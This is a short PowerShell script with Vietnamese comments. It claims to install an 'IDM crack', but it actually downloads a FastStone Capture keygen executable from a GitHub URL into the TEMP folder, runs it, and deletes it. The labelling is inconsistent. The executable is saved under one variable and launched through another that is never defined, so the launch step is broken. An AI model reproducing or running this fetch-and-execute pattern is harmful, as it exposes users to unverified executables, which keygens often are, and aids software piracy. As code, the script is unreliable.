<#
.SYNOPSIS
    Script cai dat IDM crack
.DESCRIPTION
    Thuc hien tai va cai dat IDM crack
#>

# 1. Tai va cai dat FastStone Capture Keygen
Write-Host "Dang tai va cai dat FastStone Capture Keygen..."
$idmInstaller = "$env:TEMP\keygen.exe"
try {
    Invoke-RestMethod "https://raw.githubusercontent.com/ghostminhtoan/MMT/refs/heads/main/FastStone%20Capture%20Keygen.exe" -OutFile $idmInstaller
    $process = Start-Process -FilePath $keygenInstaller -PassThru
    $process.WaitForExit()
    Remove-Item $idmInstaller -Force
    Write-Host "Da cai dat Keygen thanh cong" -ForegroundColor Green
}
catch {
    Write-Host "Loi khi cai dat Keygen: $_" -ForegroundColor Red
}

Write-Host "Hoan tat thao tac" -ForegroundColor Cyan

# Tu dong thoat sau 1 giay
Write-Host "Script se tu dong dong trong 1 giay..." -ForegroundColor Yellow
Start-Sleep -Seconds 1
exit
